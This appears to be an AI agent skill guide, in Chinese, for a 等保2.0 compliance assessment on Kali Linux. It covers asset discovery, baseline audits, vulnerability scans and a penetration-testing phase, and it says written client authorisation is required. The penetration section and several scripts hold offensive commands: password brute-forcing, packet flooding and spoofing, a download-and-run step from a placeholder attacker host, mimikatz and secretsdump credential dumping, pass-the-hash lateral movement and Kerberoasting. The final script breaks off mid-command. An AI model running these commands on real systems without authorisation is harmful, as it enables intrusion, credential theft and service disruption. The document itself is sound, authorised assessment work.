---
name: "djbh-assessment"
description: "Invoke for 等保2.0 full-lifecycle assessment on corporate networks on Kali Linux: classification, gap analysis, baseline audit, vuln scanning, penetration testing, and compliance reporting per GB/T 22239-2019."
---

# 网络安全等级保护测评技能（等保2.0）

本技能在Kali Linux环境中执行等保2.0（GB/T 22239-2019）全流程测评，覆盖安全通用要求与云计算/工控/物联网/大数据/移动互联扩展要求。

## 等保级别速查

| 等级 | 名称 | 典型对象 | 测评周期 |
|------|------|----------|----------|
| 第一级 | 自主保护级 | 小型企业内网 | 不定级 |
| 第二级 | 指导保护级 | 一般企业门户/邮件 | 每两年一次 |
| 第三级 | 监督保护级 | 政务/金融/运营商 | 每年一次 |
| 第四级 | 强制保护级 | 国家重要信息系统 | 每半年一次 |
| 第五级 | 专控保护级 | 国家核心机密系统 | 视情况而定 |

> 本技能以**第二级和第三级**为主，这也是企业最常见的等保测评级别。

## 等保2.0安全域全景图

```
┌──────────────────────────────────────────────────────────────┐
│                         安全管理要求                           │
│  安全管理制度 │ 安全管理机构 │ 安全管理人员 │ 建设管理 │ 运维管理 │
├──────────────────────────────────────────────────────────────┤
│                         安全技术要求                           │
│  物理环境 → 通信网络 → 区域边界 → 计算环境 → 管理中心          │
├──────────────────────────────────────────────────────────────┤
│                     等保2.0扩展要求（按需）                     │
│  云计算安全 │ 移动互联安全 │ 物联网安全 │ 工控安全 │ 大数据安全  │
└──────────────────────────────────────────────────────────────┘
```

## 一、测评全流程（六阶段）

```
系统定级 → 备案 → 差距分析 → 现场测评（访谈/核查/测试） → 整改加固 → 复测 → 报告
```

---

## 阶段0：系统定级与备案

> 等保测评的第一步，必须与客户确认目标系统已按《信息安全等级保护管理办法》完成定级和备案。

### 0.1 定级检查要点

| 序号 | 检查项 | 方法 |
|------|--------|------|
| 1 | 定级报告是否经专家评审 | 查阅定级报告、评审会议纪要 |
| 2 | 是否向公安机关备案 | 查验备案证明 |
| 3 | 备案等级与系统实际重要程度是否匹配 | 比对业务描述与等级要求 |
| 4 | 系统边界是否明确 | 查阅系统拓扑图与网络架构文档 |

### 0.2 访谈参考问题

| 角色 | 问题 |
|------|------|
| 系统管理员 | "请描述被测系统的业务范围、用户规模和核心数据" |
| 安全负责人 | "定级过程中做了哪些评审？备案编号是多少？" |
| 运维人员 | "系统的网络边界如何划分？与哪些外部系统互联？" |

---

## 阶段1：差距分析（现状调研）

> 目标：通过问卷调查、文档审查和初步扫描，了解系统现状与等保目标级别之间的差距。

### 1.1 文档审查清单

| 文档类型 | 内容 |
|----------|------|
| 安全管理体系 | 安全管理制度、安全策略文件、岗位职责说明 |
| 建设过程文档 | 安全方案设计、产品采购合同、验收报告 |
| 运维过程记录 | 巡检记录、变更审批、应急预案 |
| 人员管理记录 | 保密协议、培训记录、离职交接单 |
| 技术配置文档 | 网络拓扑图、IP分配表、系统配置清单 |

### 1.2 资产全发现

```bash
# 步骤1: 存活主机发现（含非标准设备）
nmap -sn -PE -PP -PM <目标网段>/24 -oA phase1_live_hosts

# 步骤2: 全端口快速扫描（优先用masscan）
masscan -p1-65535 --rate=2000 -oJ masscan_all.json $(cat phase1_live_hosts.gnmap | awk '/Up$/{print $2}' | tr '\n' ' ')

# 步骤3: 对存活端口做服务识别
nmap -sS -sV -sC -O --script banner -p $(jq -r '[.[].ports[].port]|unique|join(",")' masscan_all.json) \
  -iL hosts.list -oA phase1_service_detect

# 步骤4: DNS域名发现
fierce --domain <目标域名>
dnsrecon -d <目标域名> -t axfr
dnsenum <目标域名>
```

### 1.3 Web资产深度发现

```bash
# 子域名爆破
gobuster dns -d <目标域名> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# 目录/文件爆破
gobuster dir -u <目标URL> -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,do,action -t 50

# API端点发现
ffuf -u <目标URL>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt

# JS源码敏感信息提取
waybackurls <目标域名> | grep -E '\.js$' | httpx -o js_files.txt
for url in $(cat js_files.txt); do
  curl -s "$url" | grep -oP '(api_key|token|secret|password|endpoint|http[s]?://[^"'"'"']+)'
done
```

### 1.4 资产分类表

| 类别 | 包含对象 | 发现方式 |
|------|----------|----------|
| 网络设备 | 路由器、交换机、防火墙、负载均衡 | SNMP扫描、CDP/LLDP |
| 安全设备 | IDS/IPS、WAF、日志审计、堡垒机 | 端口特征识别 |
| 服务器 | 物理机、虚拟机、云主机 | OS指纹、端口服务 |
| 终端 | 办公PC、运维终端 | MAC地址、主机名 |
| 数据库 | MySQL/Oracle/SQLServer/MongoDB/Redis | 端口3306/1521/1433/27017/6379 |
| 中间件 | Tomcat/Nginx/IIS/Apache/WebLogic/JBoss | 端口8080/80/443/7001 |
| 应用系统 | Web应用、API服务、邮件系统 | URL扫描、业务端口 |

---

## 阶段2：现场测评（核心阶段）

> 遵照GB/T 28448-2019测评方法：**访谈 → 核查 → 测试**三维度交叉验证。

---

### 2.1 安全物理环境

> 权重：二级 5% / 三级 3%

| 控制点 | 访谈问题 | 核查内容 | 测试验证 |
|--------|----------|----------|----------|
| 物理位置选择 | 机房位于建筑哪层？ | 现场查看楼层位置 | - |
| 物理访问控制 | 进出机房需要什么审批？ | 门禁日志、登记表 | 尝试尾随进入 |
| 防盗窃和防破坏 | 设备是否固定？ | 设备标签、线缆标识 | - |
| 温湿度控制 | 空调是否双路？ | 温湿度记录、告警阈值 | 检测实际温湿度 |
| 电力供应 | UPS能支持多久？ | UPS巡检记录 | 模拟市电中断 |
| 防火 | 有哪些消防设备？ | 消防检测报告 | - |
| 防水防潮 | 是否有漏水检测？ | 检查漏水检测装置 | - |

### 2.2 安全通信网络

> 权重：二级 15% / 三级 10%

#### 访谈

| 问题 | 询问对象 |
|------|----------|
| "核心网络设备的处理能力是否满足业务高峰期需求？" | 网络管理员 |
| "带宽如何规划？是否有QoS策略？" | 网络管理员 |
| "通信线路是否有冗余？主备切换时间是多少？" | 网络管理员 |
| "系统各网段如何划分？VLAN间隔离策略是什么？" | 网络管理员 |
| "是否启用了网络加密通信？" | 安全管理员 |

#### 核查

```bash
# SNMP读取网络设备接口流量
snmpwalk -v2c -c <community> <目标IP> 1.3.6.1.2.1.2.2.1.10  # ifInOctets
snmpwalk -v2c -c <community> <目标IP> 1.3.6.1.2.1.2.2.1.16  # ifOutOctets

# 路由表信息泄露风险检查
snmpwalk -v2c -c <community> <目标IP> 1.3.6.1.2.1.4.21      # ipRouteTable
```

#### 测试

```bash
# 网络分区分域检测
# 跨VLAN通信测试
nmap -sn <VLAN_A网段> <VLAN_B网段>

# 带宽测试
iperf3 -c <目标IP> -p 5201 -t 30

# 通信加密验证
nmap --script ssl-enum-ciphers -p 443 <目标IP>
testssl.sh --csvfile tls_report.csv <目标IP>

# 网络路径追踪（确认路由是否合规）
traceroute -T <目标IP>
mtr -r -c 10 <目标IP>
```

---

### 2.3 安全区域边界

> 权重：二级 20% / 三级 15%

#### 访谈

| 问题 | 询问对象 |
|------|----------|
| "边界防火墙有哪些访问控制策略？是否默认拒绝？" | 网络管理员 |
| "是否有入侵检测/防御系统（IDS/IPS）？" | 安全管理员 |
| "是否有恶意代码防范机制？更新频率？" | 安全管理员 |

#### 核查

```bash
# 防火墙规则检测（远程探测）
nmap --script firewall-bypass -p 22,80,443,3389,8080 <目标IP>

# 检测是否有开放高危端口
nmap -p 21,23,135,139,445,3389,6379,27017 --open <目标网段> -oA open_danger_ports

# ACL有效性验证
# 使用hping3构造特殊包测试
hping3 -S -p 80 -c 3 <目标IP>
hping3 -A -p 80 -c 3 <目标IP>
hping3 -F -p 80 -c 3 <目标IP>
```

#### 测试

```bash
# 边界完整性检测
# 非法内联/外联测试
hping3 -S --spoof <伪造内网IP> -p 8080 <目标IP>

# 入侵检测能力验证
nmap -sS -T5 --max-retries 0 -p- <边界防火墙IP>   # 快速扫描触发告警

# DDoS防护能力简单验证
hping3 --flood -p 80 <目标IP>
```

---

### 2.4 安全计算环境（核心）

> 权重：二级 25% / 三级 20%

这是等保测评中内容最多、权重最高的安全域，涵盖**身份鉴别、访问控制、安全审计、入侵防范、恶意代码防范、数据完整性、数据保密性、数据备份恢复、剩余信息保护、个人信息保护**十大控制点。

#### 2.4.1 身份鉴别

##### 访谈

| 问题 | 对象 |
|------|------|
| "操作系统是否有账号口令策略？" | 系统管理员 |
| "是否使用了双因素认证？" | 安全管理员 |
| "应用系统是否有验证码、登录失败锁定等机制？" | 应用管理员 |

##### 核查 — Linux系统

```bash
# 需要远程登录到目标主机执行

# 口令策略核查
cat /etc/login.defs | grep -E '^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_MIN_LEN|^PASS_WARN_AGE'
cat /etc/pam.d/common-password | grep pam_pwquality
cat /etc/security/pwquality.conf

# 空口令账户检查
awk -F: '($2 == "" || $2 == "!" || $2 == "*") {print "空/锁账户:", $1}' /etc/shadow

# root远程登录检查
grep "^PermitRootLogin" /etc/ssh/sshd_config

# 特权账户数量
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 密码加密算法
authconfig --test | grep hashing
grep "^ENCRYPT_METHOD" /etc/login.defs
```

##### 核查 — Windows系统（通过SMB远程探测）

```bash
# 使用enum4linux进行账户策略探测
enum4linux -U <目标IP>
enum4linux -P <目标IP>   # 密码策略

# 通过crackmapexec检查
crackmapexec smb <目标IP> --pass-pol
crackmapexec smb <目标IP> --users
```

##### 核查 — 网络设备

```bash
# SNMP读取设备用户列表
snmpwalk -v2c -c <community> <设备IP> 1.3.6.1.4.1.9.9.392.1.3

# 检查SNMP默认团体字
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <设备IP>
```

##### 测试 — 口令强度

```bash
# 在线爆破测试（需明确授权）
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
      ssh://<目标IP>

# FTP弱口令
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<目标IP>

# 数据库弱口令
hydra -L user.txt -P pass.txt <目标IP> mysql
hydra -L user.txt -P pass.txt <目标IP> mssql
hydra -L user.txt -P pass.txt <目标IP> postgres
```

#### 2.4.2 访问控制

##### 核查

```bash
# Linux: 文件权限检查
find /etc -type f -perm -o+w 2>/dev/null   # 关键目录全局可写
find / -perm -4000 -o -perm -2000 2>/dev/null  # SUID/SGID文件
ls -la /etc/passwd /etc/shadow /etc/group

# Linux: sudo权限
cat /etc/sudoers | grep -v '^#' | grep -v '^$'

# 共享目录权限
nmap --script smb-enum-shares -p 445 <目标IP>

# NFS目录导出权限
showmount -e <目标IP>
nmap --script nfs-showmount <目标IP>

# FTP匿名访问
nmap --script ftp-anon -p 21 <目标IP>
```

##### 测试

```bash
# 越权访问测试
# 尝试匿名/来宾访问SMB
smbclient -L //<目标IP> -N
smbclient //<目标IP>/share -N

# 测试NFS挂载
mount -t nfs <目标IP>:/export /mnt/target -o nolock

# 测试rsync未授权
rsync <目标IP>::   # 列出模块
rsync --list-only <目标IP>::module_name
```

#### 2.4.3 安全审计

##### 访谈

| 问题 | 对象 |
|------|------|
| "审计日志保存多长时间？是否定期备份？" | 审计管理员 |
| "审计进程是否受保护，是否不可中断？" | 系统管理员 |
| "日志是否实时发送到集中审计平台？" | 安全管理员 |

##### 核查

```bash
# Linux: 审计服务状态
systemctl status auditd
auditctl -l

# 日志配置
cat /etc/rsyslog.conf | grep -v '^#' | grep -v '^$'
grep -r "^\*\.\*" /etc/rsyslog.d/ 2>/dev/null

# 日志文件权限
ls -la /var/log/

# Windows: 审计策略（通过crackmapexec）
crackmapexec smb <目标IP> -u user -p pass --audit-policies
```

##### 测试

```bash
# 审计日志完整性测试
# 生成一次登录失败事件，确认日志记录
ssh nonexist@<目标IP>

# 日志未外发检测
nmap --script rsyslog-info -p 514 <目标IP>

# Syslog接收端检查
nmap -sU -p 514 <目标IP>
```

#### 2.4.4 入侵防范

##### 核查

```bash
# Linux: 是否安装HIDS
ps aux | grep -iE 'ossec|wazuh|aide|tripwire|rkhunter|chkrootkit'

# 是否开启selinux/apparmor
getenforce
aa-status

# 是否关闭不必要服务
ss -tlnp
ss -ulnp

# 高危端口开放情况
ss -tlnp | grep -E ':21|:23|:513|:514|:111|:2049'
```

##### 测试

```bash
# 已知漏洞快速检测
nmap --script vuln --script-timeout 30s <目标IP>

# 永恒之蓝
nmap --script smb-vuln-ms17-010 -p 445 <目标IP>

# 心脏滴血
nmap --script ssl-heartbleed -p 443 <目标IP>

# RDP BlueKeep
nmap --script rdp-vuln-ms12-020 -p 3389 <目标IP>

# 暴露服务版本是否有已知CVE（使用searchsploit查询）
searchsploit apache 2.4.49
searchsploit openssh 7.4
```

#### 2.4.5 中间件安全专项

```bash
# Tomcat安全检测
nmap --script http-tomcat-brute -p 8080 <目标IP>
curl -s http://<目标IP>:8080/manager/html | head
curl -s http://<目标IP>:8080/host-manager/html | head

# JBoss/WildFly
nmap --script http-jboss-status -p 8080,9990 <目标IP>
curl -s http://<目标IP>:8080/jmx-console/
curl -s http://<目标IP>:8080/web-console/

# WebLogic
nmap -p 7001,7002 --script http-weblogic-t3 <目标IP>
curl -s http://<目标IP>:7001/console/

# phpMyAdmin
curl -s http://<目标IP>/phpmyadmin/
curl -s http://<目标IP>/phpMyAdmin/

# .git泄露
curl -s http://<目标IP>/.git/HEAD
curl -s http://<目标IP>/.svn/entries

# .env泄露
curl -s http://<目标IP>/.env
```

#### 2.4.6 数据库安全专项

```bash
# MySQL空口令
nmap --script mysql-empty-password -p 3306 <目标IP>

# MySQL枚举
nmap --script mysql-enum -p 3306 <目标IP>

# MSSQL空口令
nmap --script ms-sql-empty-password -p 1433 <目标IP>

# MSSQL信息收集
nmap --script ms-sql-info -p 1433 <目标IP>

# Oracle TNS版本
nmap --script oracle-tns-version -p 1521 <目标IP>
tnscmd10g version -h <目标IP>

# MongoDB未授权
nmap --script mongodb-info -p 27017 <目标IP>
echo 'db.version()' | timeout 3 nc <目标IP> 27017

# Redis未授权
nmap --script redis-info -p 6379 <目标IP>
redis-cli -h <目标IP> INFO server 2>/dev/null

# Elasticsearch未授权
curl -s http://<目标IP>:9200/_cat/indices
curl -s http://<目标IP>:9200/_nodes

# Memcached未授权
echo "stats" | timeout 3 nc <目标IP> 11211
```

#### 2.4.7 数据安全专项

##### 核查

```bash
# 数据备份检查（访谈为主，技术层面可做以下验证）
nmap -p 873 --script rsync-list-modules <目标IP>   # rsync备份服务
```

##### 测试

```bash
# 敏感数据传输加密
nmap --script ssl-enum-ciphers -p 443 <目标IP>
curl -I -k https://<目标IP> | grep -i strict-transport-security

# Cookie安全属性
curl -I http://<目标IP> | grep -i set-cookie
# 需确认含 HttpOnly、Secure、SameSite 属性

# 数据传输是否明文
tcpdump -i eth0 -A -s 0 port 80 and host <目标IP>
# 观察登录请求中是否传输明文密码
```

---

### 2.5 安全管理中心

> 等保2.0新增安全域，三级必备 | 权重：二级 N/A / 三级 10%

#### 访谈

| 问题 | 对象 |
|------|------|
| "是否有集中安全管理平台（SOC/SIEM）？" | 安全管理员 |
| "是否对安全设备进行集中监控和告警？" | 安全管理员 |
| "是否有统一的日志分析、关联分析能力？" | 审计管理员 |

#### 核查

```bash
# 安全运营中心探活
nmap -p 443,8443,9443 --open <管理网段>

# Syslog集中收集
nmap -sU -p 514 --open <管理网段>

# SIEM/SOC平台识别
whatweb <SOC平台URL>

# 审计平台识别
nmap -p 5601,9200 --open <管理网段>   # Elasticsearch/Kibana
nmap -p 8000,8089 --open <管理网段>   # Splunk
```

---

### 2.6 虚拟化安全专项（等保2.0新增）

```bash
# vSphere/ESXi
nmap -p 443,902,903 --script http-vmware-path-vuln <虚拟化平台IP>

# Docker API未授权
curl -s http://<目标IP>:2375/containers/json
curl -s http://<目标IP>:2376/containers/json

# Kubernetes API Server
curl -k https://<目标IP>:6443/version
curl -k https://<目标IP>:6443/api/v1/namespaces

# etcd未授权
curl http://<目标IP>:2379/v2/keys
```

---

### 2.7 密码应用安全专项（商用密码合规）

```bash
# 国密算法支持检测
nmap --script ssl-enum-ciphers -p 443 <目标IP> | grep -i 'SM2\|SM3\|SM4'

# 检查是否仍然使用MD5/SHA1证书
openssl s_client -connect <目标IP>:443 -servername <域名> 2>/dev/null | openssl x509 -noout -text | grep 'Signature Algorithm'
```

---

## 阶段3：渗透测试

> 注意：仅在客户提供书面授权且确认不影响业务的前提下执行。

### 3.1 Web应用渗透

```bash
# OWASP Top 10 自动化检测
# Nikto
nikto -h <目标URL> -output nikto_report.html -Format html

# Nuclei模板扫描
nuclei -u <目标URL> -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -o nuclei_report.txt

# SQL注入深度测试
sqlmap -u "<目标URL>?id=1" --batch --dbs --random-agent --level=3 --risk=2

# XSS测试
xsser --url="<目标URL>" --auto
dalfox url <目标URL>

# SSRF测试
# 在参数中内嵌burp collaborator地址，观察是否有SSRF回连

# 文件上传绕过测试
# 构造各类特殊后缀（.php5, .phtml, .php%00.jpg等）

# 命令注入测试
# 在参数中插入 ;id、|id、`id`等payload
```

### 3.2 系统渗透

```bash
# Metasploit自动化
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS <目标IP>; run; exit"

# 已知漏洞利用
searchsploit --nmap scan_report.xml  # 将nmap结果与exploit-db关联

# 权限提升（获取shell后）
wget http://<攻击机IP>/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh
wget http://<攻击机IP>/winPEAS.exe -O C:\Users\Public\wp.exe && C:\Users\Public\wp.exe
```

### 3.3 内网横向渗透

```bash
# 网络拓扑发现（从立足点）
# Linux上
for i in $(ip route | grep -oP '(\d+\.){2}\d+\.\d+/\d+'); do fping -a -g $i 2>/dev/null; done

# 凭据收集
mimikatz
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py domain/user:pass@<DC_IP>

# 横向移动
crackmapexec smb <内网段> -u user -H NTLM_HASH --shares
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :NTLM_HASH domain/user@<目标IP>
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :NTLM_HASH domain/user@<目标IP>

# Kerberoasting
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py domain/user:pass -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

---

## 阶段4：整改加固建议

> 根据差距分析和现场测评结果，将不符合项按严重程度分为三级，提出可操作的整改建议。

| 问题分级 | 定义 | 整改时限 |
|----------|------|----------|
| **高危** | 可直接导致系统被攻击、数据泄露 | 立即整改 |
| **中危** | 存在安全隐患，可能被利用 | 30天内 |
| **低危** | 安全配置建议，优化项 | 90天内 |

### 常见整改项速查

| 不合规项 | 等保要求 | 整改方案 |
|----------|----------|----------|
| 密码策略弱 | 密码长度≥8位，含大小写数字特殊字符三种以上 | 修改/etc/login.defs + pwquality.conf |
| 未限制登录失败 | 连续失败5次锁定≥10分钟 | 配置pam_tally2 或 fail2ban |
| root远程登录 | 禁止root直接远程登录 | PermitRootLogin no |
| 默认SNMP团体字 | 不使用public/private | 修改SNMP v3或复杂团体字 |
| 高危端口开放 | 关闭telnet/ftp/rlogin等不安全服务 | systemctl disable --now telnet.socket |
| 日志未集中管理 | 审计日志需集中存储 | 配置rsyslog转发到日志服务器 |
| 未配置HTTPS | 敏感数据传输需加密 | 部署SSL证书，强制HTTPS |
| 存在已知CVE | 及时打补丁 | 升级软件版本或配置虚拟补丁(WAF) |

---

## 阶段5：复测验证

| 步骤 | 操作 |
|------|------|
| 1 | 逐一核实高危和中危不符合项是否已整改 |
| 2 | 对整改项执行原测试命令做回归验证 |
| 3 | 截图/录屏保存整改证据 |
| 4 | 更新测评记录表中的"整改后复测"列 |
| 5 | 确认所有不符合项已关闭或降级为残余风险 |
| 6 | 输出复测报告，作为最终测评报告的附件 |

---

## 阶段6：报告生成

### 6.1 必须生成的测评文档

| 文档 | 依据 |
|------|------|
| 测评方案 | 包含测评指标、测评对象、测评方法 |
| 现场测评记录 | 每项指标的访谈/核查/测试原始记录 |
| 测评报告（主报告） | 结论、分数、不符合项清单、整改建议 |
| 整改建议书 | 可落地的技术整改步骤 |
| 复测报告 | 整改后的回归验证结果 |

### 6.2 报告核心结构

```
1. 测评项目概述
   1.1 被测系统描述
   1.2 测评等级与依据
   1.3 测评范围

2. 测评过程与方法
   2.1 测评流程
   2.2 测评方法（访谈/核查/测试）

3. 被测系统概述
   3.1 网络拓扑
   3.2 资产清单
   3.3 业务应用清单

4. 单元测评结果
   4.1 安全物理环境
   4.2 安全通信网络
   4.3 安全区域边界
   4.4 安全计算环境
   4.5 安全管理中心
   4.6 安全管理制度
   4.7 安全管理机构
   4.8 安全管理人员
   4.9 安全建设管理
   4.10 安全运维管理

5. 整体测评结果
   5.1 层面间安全补偿分析
   5.2 区域间安全补偿分析

6. 综合结论与评分
   6.1 安全技术得分
   6.2 安全管理得分
   6.3 综合得分与符合性

7. 不符合项与整改建议

8. 附录
   8.1 测评记录表
   8.2 工具输出原始文件
   8.3 截图/照片证据
```

### 6.3 工具报告汇总脚本

```bash
#!/bin/bash
# 等保测评报告汇总 - 将所有扫描结果整合到报告目录
# 用法: ./report_collector.sh <项目名> <扫描结果目录>

PROJECT=$1
SCAN_DIR=$2
REPORT_DIR="./djbh_report_${PROJECT}_$(date +%Y%m%d_%H%M%S)"

if [ -z "$PROJECT" ] || [ -z "$SCAN_DIR" ]; then
    echo "用法: $0 <项目名> <扫描结果目录>"
    exit 1
fi

mkdir -p "${REPORT_DIR}"/{01_asset,02_baseline,03_vuln,04_pentest,05_evidences,06_raw}

# 汇总nmap结果
cp "${SCAN_DIR}"/phase1_*.xml "${REPORT_DIR}/06_raw/" 2>/dev/null
cp "${SCAN_DIR}"/*.xml "${REPORT_DIR}/06_raw/" 2>/dev/null

# 生成HTML报告
for xml in "${REPORT_DIR}/06_raw/"*.xml; do
    [ -f "$xml" ] && xsltproc "$xml" -o "${REPORT_DIR}/06_raw/$(basename "$xml" .xml).html" 2>/dev/null
done

# 汇总漏洞列表
grep -hri 'CVE-\|高危\|严重\|High\|Critical' "${SCAN_DIR}/"*.txt 2>/dev/null > "${REPORT_DIR}/03_vuln/vuln_summary.txt"

echo "报告目录: ${REPORT_DIR}"
echo "请将访谈记录、核查截图、复测结果放入对应子目录"
```

---

## 附录A：等保2.0评分速算

### 三级等保及格线

| 安全域 | 满分 | 及格线(≥70%) |
|--------|------|-------------|
| 安全物理环境 | 100 | ≥70 |
| 安全通信网络 | 100 | ≥70 |
| 安全区域边界 | 100 | ≥70 |
| 安全计算环境 | 100 | ≥70 |
| 安全管理中心 | 100 | ≥70 |
| 安全管理制度 | 100 | ≥70 |
| 安全管理机构 | 100 | ≥70 |
| 安全管理人员 | 100 | ≥70 |
| 安全建设管理 | 100 | ≥70 |
| 安全运维管理 | 100 | ≥70 |

**整体判定规则**：所有安全域均≥70分，且无"一票否决"项（如核心系统弱口令、未授权访问等），判定为**基本符合**。

---

## 附录B：全流程自动化脚本

```bash
#!/bin/bash
# 等保2.0测评全流程自动化脚本
# 环境: Kali Linux
# 授权: 必须获得客户书面授权后方可执行

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info()  { echo -e "${GREEN}[INFO]${NC}  $(date '+%H:%M:%S') $*"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $(date '+%H:%M:%S') $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $(date '+%H:%M:%S') $*"; }

usage() {
    cat <<EOF
用法: ./djbh_full_scan.sh <配置文件>
配置文件格式 (djbh.conf):
  TARGET_NETWORK="192.168.1.0/24"
  TARGET_WEB_URL="https://www.example.com"
  TARGET_WEB_IP="192.168.1.10"
  ASSESSMENT_LEVEL="3"          # 等保级别：2 或 3
  ENABLE_PENTEST="false"        # 是否执行渗透测试阶段
  ENABLE_BRUTEFORCE="false"     # 是否执行口令爆破
  SCAN_SPEED="4"                # nmap -T 速率
  EXCLUDE_IPS="192.168.1.1,192.168.1.254"
  MANAGER_NETWORK="10.0.0.0/24" # 管理网段（等保三级必填）
EOF
    exit 1
}

# 加载配置
CONFIG_FILE="${1:-}"
[ -z "$CONFIG_FILE" ] && usage
[ ! -f "$CONFIG_FILE" ] && { log_error "配置文件不存在: $CONFIG_FILE"; exit 1; }
source "$CONFIG_FILE"

# 校验必要参数
[ -z "${TARGET_NETWORK:-}" ] && { log_error "TARGET_NETWORK 未配置"; exit 1; }
LEVEL="${ASSESSMENT_LEVEL:-2}"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_BASE="./djbh_report_${TIMESTAMP}"
mkdir -p "${REPORT_BASE}"/{01_asset_discovery,02_baseline_check,03_vulnerability_scan,04_pentest,05_logs}

exec > >(tee -a "${REPORT_BASE}/05_logs/full_scan.log") 2>&1

log_info "========================================="
log_info "等保${LEVEL}级测评开始"
log_info "目标网络: ${TARGET_NETWORK}"
log_info "报告目录: ${REPORT_BASE}"
log_info "========================================="

# =============================================
# 阶段1: 信息收集与资产发现
# =============================================
log_info "阶段1: 信息收集与资产发现"

log_info "  1.1 存活主机发现..."
nmap -sn -PE -PP -PM -T"${SCAN_SPEED:-4}" "${TARGET_NETWORK}" \
    -oA "${REPORT_BASE}/01_asset_discovery/01_live_hosts" \
    --exclude "${EXCLUDE_IPS:-}"

grep "Nmap scan report" "${REPORT_BASE}/01_asset_discovery/01_live_hosts.nmap" | \
    awk '{print $NF}' | tr -d '()' > "${REPORT_BASE}/01_asset_discovery/hosts.list"

HOST_COUNT=$(wc -l < "${REPORT_BASE}/01_asset_discovery/hosts.list")
log_info "  发现存活主机: ${HOST_COUNT} 台"

if [ "$HOST_COUNT" -eq 0 ]; then
    log_warn "  未发现存活主机，检查TARGET_NETWORK配置"
    exit 0
fi

log_info "  1.2 全端口扫描..."
masscan -p1-65535 --rate=2000 -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oJ "${REPORT_BASE}/01_asset_discovery/02_masscan_ports.json" 2>/dev/null || \
    log_warn "  masscan执行异常，跳过"

log_info "  1.3 服务版本与OS检测..."
nmap -sS -sV -sC -O -T"${SCAN_SPEED:-4}" \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/01_asset_discovery/03_service_detect" \
    --exclude "${EXCLUDE_IPS:-}"

# =============================================
# 阶段2: 安全配置基线检查
# =============================================
log_info "阶段2: 安全配置基线检查"

log_info "  2.1 TLS/SSL配置检查..."
if [ -n "${TARGET_WEB_URL:-}" ]; then
    testssl.sh --csvfile "${REPORT_BASE}/02_baseline_check/tls_report.csv" \
        "${TARGET_WEB_URL}" 2>/dev/null || log_warn "  testssl.sh 执行异常"
fi

log_info "  2.2 高危端口暴露检查..."
nmap -p 21,23,135,139,445,3389,6379,27017,2375,2376,6443 \
    --open -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/02_baseline_check/04_danger_ports" \
    --exclude "${EXCLUDE_IPS:-}"

log_info "  2.3 SMB共享枚举..."
nmap -p 445 --script smb-enum-shares,smb-enum-users \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/02_baseline_check/05_smb_enum" 2>/dev/null || true

log_info "  2.4 SNMP默认团体字..."
while read -r ip; do
    onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
        "$ip" >> "${REPORT_BASE}/02_baseline_check/06_snmp_community.txt" 2>/dev/null || true
done < "${REPORT_BASE}/01_asset_discovery/hosts.list"

# =============================================
# 阶段3: 漏洞扫描
# =============================================
log_info "阶段3: 漏洞扫描"

log_info "  3.1 常见CVE检测..."
nmap --script vuln --script-timeout 60s \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/03_vulnerability_scan/07_vuln_scan" \
    --exclude "${EXCLUDE_IPS:-}" || log_warn "  vuln 脚本部分超时"

log_info "  3.2 数据库安全检测..."
# MySQL
nmap -p 3306 --script mysql-empty-password,mysql-enum \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/03_vulnerability_scan/08_mysql" 2>/dev/null || true

# Redis
nmap -p 6379 --script redis-info \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/03_vulnerability_scan/09_redis" 2>/dev/null || true

# MongoDB
nmap -p 27017 --script mongodb-info \
    -iL "${REPORT_BASE}/01_asset_discovery/hosts.list" \
    -oA "${REPORT_BASE}/03_vulnerability_scan/10_mongodb" 2>/dev/null || true

# =============================================
# 阶段4: 渗透测试（可选）
# =============================================
if [ "${ENABLE_PENTEST:-false}" = "true" ]; then
    log_warn "阶段4: 渗透测试（已启用）"

    if [ -n "${TARGET_WEB_URL:-}" ]; then
        log_info "  4.1 Web漏洞扫描..."
        nikto -h "${TARGET_WEB_URL}" -output "${REPORT_BASE}/04_pentest/nikto_report.html" \
            -Format html 2>/dev/null || log_warn "  nikto 执行异常"

        nuclei -u "${TARGET_WEB_URL}" -silent \
            -o "${REPORT_BASE}/04_pentest/nuclei_report.txt" 2>/dev/null || \
            log_warn "  nuclei 执行异常"
    fi

    if [ "${ENABLE_BRUTEFORCE:-false}" = "true" ] && [ -n "${TARGET_WEB_URL:-}" ]; then
        log_warn "  4.2 口令爆破（需确认授权）..."
        hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
